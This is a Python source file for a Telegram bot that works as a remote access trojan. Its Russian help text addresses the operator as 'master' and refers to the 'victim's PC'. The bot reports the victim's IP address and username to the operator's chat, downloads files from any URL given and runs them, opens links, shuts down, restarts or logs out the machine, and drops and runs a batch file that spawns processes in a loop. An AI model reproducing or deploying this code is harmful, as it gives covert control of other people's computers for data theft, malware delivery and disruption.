import telebot
import config
import subprocess
import smtplib
import ctypes
import os, shutil
from time import sleep
from requests import get
from telebot import types
from pathlib import Path
from socket import gethostname, gethostbyname
from webbrowser import open_new


chat_id = config.CHAT_ID


result = ''
file_name = ''
path_to_file = ''

# функция которая записывает полученый ответ из cmd  в понятный текст в отдельный файл


def run_command(command, path):
    global result
    global path_to_file

    path_to_file = path
    encoding = os.device_encoding(1) or ctypes.windll.kernel32.GetOEMCP()
    result = subprocess.check_output(command, encoding=encoding)

    # создание файла
    Path(path).expanduser().write_text(result)


def remove_file(path):
    if os.path.exists(path):
        os.remove(path)


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# скачивает ФАЙЛ С ИНТЕРНЕТА В ПАКУ


def download(url):
    global file_name
    response = get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb')as new_file:
        new_file.write(response.content)


bot = telebot.TeleBot(config.TOKEN)



try:
    # -------------------------------------------------------------------------------------------------- #

    @bot.message_handler(commands=['start'])
    def command_start(message):
        global chat_id
        if message.chat.id == chat_id:

            bot.send_message(chat_id,
                             '=========|  МОЙ ХОЗЯИН Я ГОТОВ ТЕБЯ СЛУШАТЬ |=========\n'
                             '\n'
                             '[+] <b>ЕСЛИ ТЕБЕ НУЖНА ПОМОШЬ ТО НАПИШИ КОМАНДУ</b> /help\n'
                             '\n'
                             '[+] <b>НАПИШИ МНЕ КОМАНДУ:</b>\n',
                             parse_mode='html')

    @bot.message_handler(commands=['help'])
    def command_help(message):
        global chat_id
        if message.chat.id == chat_id:

            bot.send_message(chat_id,       '~~~~~~~~DOCUMENTATION~~~~~~~~\n'

                                            '[+] <b>Узнать IP адресс: </b> /get_IP \n'
                                            '\n'
                                            '[+] <b>Имя пользователя: </b> /get_username \n'
                                            '\n'
                                            '[+] <b>Загрузить программу на PC жертвы: </b> /download\n'
                                            '\n'
                                            '[+] <b>Открыть сылку: </b> /open_url \n'
                                            '\n'
                                            '[+] <b>Выключить PC (время): </b> /shutdown_os \n'
                                            '\n'
                                            '[+] <b>В спящий режим PC: </b> /sleep_os \n'
                                            '\n'
                                            '[+] <b>Перезагрузить PC: </b> /restart_os \n'
                                            '\n'
                                            '[+] <b>Выход из системы: </b> /exit_os  \n'
                                            '\n'
                                            '[+] <b>Подшутить над другом: </b> /prank_hack  \n',
                             parse_mode='html')


    #=====================================ФУНКЦИЯ КОТОРАЯ ВОРУЕТ IP =======================================#
    @bot.message_handler(commands=['get_IP'])
    def get_ip_macadress(message):
        global chat_id
        if message.chat.id == chat_id:

            bot.send_message(chat_id, '[..] Ищу IP... ')
            sleep(5)

            hostname = gethostname()
            ip_adress = gethostbyname(hostname)
            bot.send_message(chat_id, f'[$] IP адресс: {ip_adress}')

    #=====================================ФУНКЦИЯ КОТОРАЯ ВЫДАЕТ USERNAME =======================================#
    @bot.message_handler(commands=['get_username'])
    def get_username(message):
        global chat_id
        if message.chat.id == chat_id:

            dictioner_os = os.environ
            username = dictioner_os['USERNAME']

            bot.send_message(chat_id, '[..] Ищу username... ')
            sleep(5)
            bot.send_message(chat_id, f'[$] Имя пользователя: {username}')

    #=====================================ФУНКЦИЯ КОТОРАЯ СКАЧИВАЕТ ФАЙЛ ПО СЫЛКЕ=======================================#

    @bot.message_handler(commands=['download'])
    def download_file(message):
        global chat_id
        if message.chat.id == chat_id:

            bot.send_message(chat_id, '''
[!] Отправь мне сылку файла который ты хочешь скачать:
[!] Конце имени файла должен быть его тип(jpg, dll, png и т.д)
                                      ''')

            bot.register_next_step_handler(message, download_by_url)

    def download_by_url(message):
        url_file = message.text
        bot.send_message(chat_id, '[..] Скачиваю...')

        sleep(5)
        download(url_file)
        if os.path.exists(file_name):
            bot.send_message(chat_id, '[$] Файл скачался')
            bot.send_message(chat_id, '[+] Удалить файл: /delete_file\n'
                                      '[+] Открыть файл: /open_file\n')

            bot.register_next_step_handler(message, control_file)

    def control_file(message):

        if message.text == '/delete_file':
            remove_file(file_name)
            bot.send_message(chat_id, '[..] Удаляю...')
            sleep(3)
            bot.send_message(chat_id, '[$] Удалил')

        if message.text == '/open_file':
            bot.send_message(chat_id, '[..] Открываю')
            sleep(3)
            os.startfile(file_name)
            bot.send_message(chat_id, '''
[$]  Открыл\n
[?] Что бы удалить файл повторите все проделанные действия заного''')

    #=====================================ФУНКЦИЯ КОТОРАЯ ОТКРЫВАЕТ СЫЛКУ =======================================#
    @bot.message_handler(commands=['open_url'])
    def open_url(message):
        global chat_id
        if message.chat.id == chat_id:

            bot.send_message(
                chat_id, '[!] Отправь мне сылку которую надо открыть:')
            bot.register_next_step_handler(message, search_url)

    def search_url(message):
        bot.send_message(chat_id, '[..] Открываю..')
        sleep(3)

        open_new(message.text)
        bot.send_message(chat_id, '[$] Сылка открыта')


    #===================================== Выключение РС =======================================#
    @bot.message_handler(commands=['shutdown_os'])
    def shutdown_os(message):
        global chat_id
        if message.chat.id == chat_id:
            bot.send_message(chat_id, '[!] Вы точно уверены (y/n):')
            bot.register_next_step_handler(message, control_shutdown_os)

    def control_shutdown_os(message):
        if message.text == 'y':
            command = 'shutdown /s /t 10'

            bot.send_message(
                chat_id, '[!] PC выключится через 10s подождите...')
            subprocess.run(command, shell=True)
            sleep(5)
            bot.send_message(chat_id, '[!] Я выключаюсь до скорово ✋🏻')

        if message.text == 'n':
            bot.send_message(chat_id, '[!] Cледуюший раз')


    #===================================== СПЯШИЙ РЕЖИМ =======================================#
    @bot.message_handler(commands=['sleep_os'])
    def sleep_os(message):
        global chat_id
        if message.chat.id == chat_id:
            bot.send_message(chat_id, '[!] Вы точно уверены (y/n):')
            bot.register_next_step_handler(message, control_sleep_os)

    def control_sleep_os(message):
        if message.text == 'y':
            command = 'rundll32.exe powrprof.dll,SetSuspendState'

            bot.send_message(chat_id, '[!] Спать через 10s подождите...')
            sleep(5)
            bot.send_message(chat_id, '[!] Я выключаюсь до скорово ✋🏻')
            sleep(3)
            subprocess.run(command, shell=True)

        if message.text == 'n':
            bot.send_message(chat_id, '[!] Cледуюший раз')


    #===================================== ПЕРЕЗАГРУЗКА =======================================#
    @bot.message_handler(commands=['restart_os'])
    def restart_os(message):
        global chat_id
        if message.chat.id == chat_id:
            bot.send_message(chat_id, '[!] Вы точно уверены (y/n):')
            bot.register_next_step_handler(message, control_restat_os)

    def control_restat_os(message):
        if message.text == 'y':
            command = 'shutdown /r /o'

            bot.send_message(
                chat_id, '[!] Перезагрузка через 10s подождите...')
            sleep(5)
            bot.send_message(chat_id, '[!] Я выключаюсь до скорово ✋🏻')
            sleep(3)
            subprocess.run(command, shell=True)

        if message.text == 'n':
            bot.send_message(chat_id, '[!] Cледуюший раз')


    #===================================== ВЫХОД ИЗ СИСТЕМЫ =======================================#
    @bot.message_handler(commands=['exit_os'])
    def exit_os(message):
        global chat_id
        if message.chat.id == chat_id:
            bot.send_message(chat_id, '[!] Вы точно уверены (y/n):')
            bot.register_next_step_handler(message, control_exit_os)

    def control_exit_os(message):
        if message.text == 'y':
            command = 'shutdown /l'

            bot.send_message(chat_id, '[!] Выход через 10s подождите...')
            sleep(5)
            bot.send_message(chat_id, '[!] Я выключаюсь до скорово ✋🏻')
            sleep(3)
            subprocess.run(command, shell=True)

        if message.text == 'n':
            bot.send_message(chat_id, '[!] Cледуюший раз')

        else:
            bot.send_message(
                chat_id, '[?] Не заню, что ты хотел сказать но команда прервана')

    #===================================== ПРАНК ВИРУС =======================================#
    @bot.message_handler(commands=['prank_hack'])
    def prank_hack(message):
        global chat_id
        if message.chat.id == chat_id:
            bot.send_message(chat_id, '[!] Запускаю пранк...')

            name_file = 'prank.bat'
            code = '''
@echo off
color 0a
mode 2
systeminfo
ipconfig
pause
start start start start start start start start start start start start start start start start start start start start
start start start start start start start start start start start start
:A
echo %random%10%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
goto A'''

            if not os.path.exists(name_file):
                with open(name_file, 'w') as file:
                    file.write(code)

            sleep(3)
            if os.path.exists(name_file):
                os.startfile(name_file)

                markup = types.ReplyKeyboardMarkup(
                    resize_keyboard=True, one_time_keyboard=True, row_width=1)
                button = types.KeyboardButton('DELETE')
                markup.add(button)

                bot.send_message(chat_id, '[!] Друг испугался 😂\n'
                                        '[!] Удаляю Файл...?', reply_markup=markup)
                bot.register_next_step_handler(message, delete_prank_bat)

            else:
                bot.send_message(chat_id, '[!] Не удается выполнить команду')

    def delete_prank_bat(message):
        name_file = 'prank.bat'

        if message.text:
            bot.send_message(chat_id, '[..] Удаляю...')
            sleep(5)
            remove_file(name_file)
            bot.send_message(chat_id, '[$] Файл удален с PC жертвы')

    bot.polling(none_stop=True)

except TypeError or Exception or ConnectionError or TimeoutError:
    bot.send_message(
        chat_id, '[!!] ВОЗНИКЛА НЕ ПРЕДВИДЕННАЯ ОШИБКА (повторите попытку)')
